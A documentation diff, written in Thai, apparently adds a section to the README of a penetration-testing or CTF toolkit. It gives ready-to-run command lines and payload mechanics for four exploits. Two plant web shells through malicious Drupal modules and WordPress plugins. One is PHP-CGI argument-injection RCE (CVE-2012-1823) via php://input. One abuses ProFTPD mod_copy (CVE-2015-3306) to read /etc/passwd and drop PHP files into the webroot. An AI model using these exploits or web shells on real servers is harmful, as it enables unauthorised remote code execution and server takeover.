@@ -66,3 +66,28 @@ python scripts/tool_manager.py install jwt_tool --sha256 <64-hex>
 
 - Hash ไม่ตรง = ไฟล์ถูกลบทิ้งและไม่ติดตั้ง
 - ก่อนรัน binary ที่เพิ่งโหลดมา ควรรัน `verify` ก่อนทุกครั้ง
+
+### 7. สคริปต์เฉพาะทางที่เพิ่มไว้ใน `tools/`
+```bash
+# Drupal admin -> module upload RCE (Drupal 8/9/10, ต้องมีสิทธิ์ administer modules)
+python tools/drupal_admin_rce.py --url http://target --user admin --pass password --cmd id
+python tools/drupal_admin_rce.py --url http://target --user admin --pass password --shell
+
+# WordPress admin -> malicious plugin upload RCE (ต้องมีสิทธิ์ install_plugins)
+python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --cmd id
+python tools/wordpress_admin_rce.py --url http://target --user admin --pass 'P@ssw0rd' --shell
+
+# PHP-CGI argument injection CVE-2012-1823 (ดึง source ด้วย -s / RCE ด้วย -d)
+python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --source
+python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --cmd id
+
+# ProFTPD mod_copy CVE-2015-3306 (copy ไฟล์ -> webroot -> HTTP)
+python tools/proftpd_modcopy_cve_2015_3306.py --host target --read /etc/passwd --web http://target
+python tools/proftpd_modcopy_cve_2015_3306.py --host target --cpfr /tmp/x.php --cpto /var/www/html/x.php
+python tools/proftpd_modcopy_cve_2015_3306.py --host target --find-flag --web http://target
+```
+- Drupal: สร้างโมดูล PHP (`info.yml` + `routing.yml` + Controller `shell_exec`) แล้วอัปโหลดผ่าน `/admin/modules/install`, enable ที่ `/admin/modules`; route `GET /<module>?c=<cmd>`
+- WordPress: สร้าง plugin zip แล้วอัปโหลดผ่าน `update.php?action=upload-plugin`; เรียก `GET /wp-content/plugins/<slug>/<slug>.php?c=<cmd>` (ไม่ต้อง activate)
+- PHP-CGI: `?-s` แสดง source (highlighted) และ `?-d allow_url_include=on -d auto_prepend_file=php://input` + body PHP = RCE
+- ProFTPD: `SITE CPFR`/`SITE CPTO` ใช้ได้ก่อน login; `--find-flag` ถอดชื่อไฟล์ที่สุ่มจาก timestamp (`btime + starttime/100`)
+- ทำงานได้เมื่อ web user เขียนโฟลเดอร์ modules/ หรือ wp-content/plugins/ ได้ (typical CTF lab)
